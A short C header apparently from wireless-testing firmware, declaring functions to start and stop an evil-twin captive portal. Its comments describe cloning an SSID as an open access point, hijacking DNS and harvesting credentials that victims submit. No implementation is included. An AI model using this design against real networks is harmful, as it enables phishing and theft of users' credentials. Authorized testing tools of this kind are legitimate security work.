#pragma once

#include "m1_rpc_proto.h"
#include "m1_rpc.h"

/**
 * Evil-twin captive portal.
 *
 * Start: bring up an open SoftAP with the supplied SSID, redirect all DNS to
 * the AP gateway, and serve a captive portal that POSTs credentials back as
 * M1_EVT_EVILTWIN_CREDS events.
 *
 * Start payload: [1 byte ssid_len][ssid][1 byte channel]
 */
m1_status_t m1_eviltwin_start(const uint8_t *payload, uint16_t len);
m1_status_t m1_eviltwin_stop(void);

/* Short code describing the most recent m1_eviltwin_start() failure. */
const char *m1_eviltwin_last_err(void);
